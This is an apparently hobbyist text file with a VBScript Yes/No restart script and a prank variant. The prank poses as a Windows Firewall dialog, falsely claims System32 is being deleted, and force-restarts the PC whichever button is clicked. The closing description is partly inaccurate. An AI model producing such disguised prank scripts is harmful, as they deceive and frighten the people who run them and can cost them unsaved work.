@@ -1,0 +1,43 @@
+lol shutdown script with .vbs cuz im c00l B^^^^))))))))))
+--Simple Yes/No shutdown thingy, asks if you want to shutdown if yes, shutdown. If no, Exits.
+simple enough tbh
+on the 10th line in at the end you can see "20", thats the timeout, you can change it to 0 if you want
+the shutdown the happen instantly.
+
+Option Explicit
+
+Dim result
+result = MsgBox ("Shutdown?", vbYesNo, "Yes/No Exm")
+Select Case result
+    Case vbYes
+        MsgBox("shuting down ...")
+        Dim objShell
+        Set objShell = WScript.CreateObject("WScript.Shell")
+        objShell.Run "C:\WINDOWS\system32\shutdown.exe -r -t 20"
+    Case vbNo
+        MsgBox("Ok")
+End Select
+
+And you could be a real dick and change it up a bit...
+
+Option Explicit
+
+Dim result
+result = MsgBox ("Are you sure you want to delete System32?", vbYesNo, "Windows Firewall")
+Select Case result
+    Case vbYes
+        MsgBox("Windows can no longer function properly, try re-installing Windows and reboot.")
+        Dim objShell
+        Set objShell = WScript.CreateObject("WScript.Shell")
+        objShell.Run "C:\WINDOWS\system32\shutdown.exe -r -t 0"
+    Case vbNo
+        MsgBox("Windows can not function without C:\WINDOWS\System32. Try re-installing Windows or replacing the hard drive. For further information contact Microsoft https://www.support.microsoft.com/id?=EN-US")
+        Dim objShell
+        Set objShell = WScript.CreateObject("WScript.Shell")
+        objShell.Run "C:\WINDOWS\system32\shutdown.exe -r -t 0"
+End Select
+
+--So when you click the file it will popup with a message box asking if you want to shut down, if you press "No" it exits the message box and youre
+all good!
+But
+If you press "Yes" then it will shutdown the computer, simple as that tbh.
